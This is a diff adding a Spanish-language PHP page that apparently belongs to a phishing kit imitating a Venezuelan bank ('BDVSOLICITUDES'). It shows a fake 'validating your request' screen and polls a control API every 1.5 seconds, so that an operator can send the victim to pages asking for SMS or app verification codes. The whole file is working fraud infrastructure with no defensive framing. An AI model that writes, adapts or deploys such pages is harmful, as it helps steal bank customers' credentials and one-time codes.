@@ -1,0 +1,237 @@
+<?php 
+session_start();
+$session_id = session_id();
+?>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>BDVSOLICITUDES</title>
+    <style>
+      body {
+        margin: 0;
+        padding: 0;
+        font-family: Arial, sans-serif;
+        height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background-image: url(background.webp);
+        background-size: cover;
+        background-position: center;
+      }
+
+      .container {
+        display: flex;
+
+        height: 100%;
+        width: 100%;
+      }
+
+      .left-side {
+        width: 50%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+
+      .right-side {
+        width: 50%;
+      }
+      form {
+        width: 80%;
+        background: white;
+        max-width: 550px;
+        box-shadow: 0 5px 10px 0 rgba(0, 0, 0, 0.1);
+      }
+
+      @media (max-width: 768px) {
+        body {
+          background: #ededed;
+        }
+        .container {
+          flex-direction: column;
+        }
+        .left-side {
+          width: 100%;
+          height: 100vh;
+        }
+        .right-side {
+          display: none;
+        }
+      }
+    </style>
+    <style>
+      .form-group {
+        position: relative;
+        margin-bottom: 20px;
+        margin: 20px;
+      }
+
+      .form-group label {
+        position: absolute;
+        top: 50%;
+        left: 10px;
+        transform: translateY(-55%);
+        color: #999;
+        transition: top 0.3s, font-size 0.3s;
+        pointer-events: none;
+      }
+
+      .form-group input {
+        width: 100%;
+        padding: 10px;
+        box-sizing: border-box;
+        position: relative;
+        height: 60px;
+        border: 0;
+
+        border-bottom: 1px solid gray;
+        background: #ededed;
+        outline: none;
+      }
+      .form-group input:focus {
+        border: 0;
+      }
+      .form-group input:focus + label,
+      .form-group input:not(:placeholder-shown) + label {
+        top: 5px;
+        font-size: 12px;
+      }
+      button {
+        background-color: #0067b1;
+        color: white;
+        border-radius: 3px;
+        border: 0;
+        padding: 15px;
+        width: 200px;
+      }
+    </style>
+    <style>
+      .form-group2 {
+        position: relative;
+        margin-bottom: 20px;
+        margin: 20px;
+      }
+
+      .form-group2 label {
+        position: absolute;
+        top: 50%;
+        left: 23%;
+        transform: translateY(-55%);
+        color: #999;
+        transition: top 0.3s, font-size 0.3s;
+        pointer-events: none;
+      }
+
+      .form-group2 input {
+        padding: 10px;
+        box-sizing: border-box;
+        position: relative;
+        height: 60px;
+        border: 0;
+        border-bottom: 1px solid gray;
+        background: #ededed;
+
+        outline: none;
+      }
+      .form-group2 input:focus {
+        border: 0;
+      }
+      .form-group2 input:focus + label,
+      .form-group2 input:not(:placeholder-shown) + label {
+        top: 5px;
+        font-size: 12px;
+      }
+    </style>
+    <style>
+      .overlay {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.5); /* Fondo semitransparente */
+        z-index: 9999; /* Asegura que esté por encima de otros elementos */
+      }
+
+      .content {
+        background-color: #fff;
+        width: 350px;
+        border-radius: 5px;
+        text-align: center;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="left-side">
+        <form>
+          <div style="text-align: center">
+            <img src="logo.png" alt="" style="width: 60%; margin-top: 20px" />
+          </div>
+          <div style="width: 100%; text-align: center">
+            <div class="form-group">
+              <img src="ldr.gif" style="width: 100px" />
+            </div>
+          </div>
+
+          <div
+            style="
+              width: 100%;
+              text-align: center;
+              font-size: 12px;
+              font-weight: bold;
+              color: #999;
+              margin-top: 30px;
+              margin-bottom: 30px;
+            "
+          >
+            Estamos validando tu solicitud. <br />
+            <br />
+            <br />
+          </div>
+        </form>
+      </div>
+      <div class="right-side"></div>
+    </div>
+	<script>
+        const sessionId = "<?php echo $session_id; ?>";
+        let countdown = 29;
+        const countdownElement = document.getElementById('countdown');
+
+        function checkDecision() {
+            fetch('control_api.php?session_id=' + sessionId)
+                .then(response => response.json())
+                .then(data => {
+                    const status = data.status;
+                    
+                    if (status === 'USUARIO') {
+                        window.location.href = 'error.html'; 
+                    } else if (status === 'SUCCESS') {
+                        window.location.href = 'codesms.html'; 
+                    } else if (status === 'AMIVEN') {
+                        window.location.href = 'codeamiven.html'; 
+                    } else if (status === 'FINALIZADO') {
+                        // NUEVA REDIRECCIÓN AQUÍ
+                        window.location.href = 'finalizado.html'; 
+                    }
+                })
+                .catch(error => {
+                    console.error('Error al verificar decisión:', error);
+                });
+        }
+
+        // Polling: Chequea la decisión cada 1.5 segundos.
+        const checkIntervalId = setInterval(checkDecision, 1500); 
+
+        window.onbeforeunload = function() {
+            clearInterval(intervalId);
+            clearInterval(checkIntervalId);
+        };
+    </script>
+  </body>
+</html>
